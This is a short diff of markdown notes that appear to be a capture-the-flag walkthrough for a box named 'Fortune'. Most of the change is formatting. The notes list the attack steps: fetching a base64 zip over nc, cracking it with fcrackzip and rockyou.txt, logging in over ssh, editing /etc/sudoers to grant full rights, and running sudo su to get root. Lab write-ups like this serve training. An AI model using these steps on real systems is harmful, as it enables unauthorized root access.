@@ -100,16 +100,21 @@ sudo chmod -sx /usr/lib/git-core/git
 
 ## Fortune:  
 Requires: fcrackzip  
-  
+`
 nc <BOX_IP> 3333  
-#returns base 64 hash of a file.    
+`
+Returns base 64 hash of a file.    
 Go here https://base64.guru/converter/decode/file and get the zip file.  
+`
 fcrackzip -v -u -D -p <location of rockyou.txt> application.zip  
+`
 Open the zip with the password you got.  Should contain password for fortune account.  
+```
 ssh fortuna@<BOX IP>  
 sudo pico /etc/sudoers  
+```
 Replace pico in sudoers file with ALL. (e.g. fortuna    ALL=(ALL:ALL) ALL)  
-sudo su  
+`sudo su`  
 you're root  
 stuff to do:   
 	change password to fortuna.  
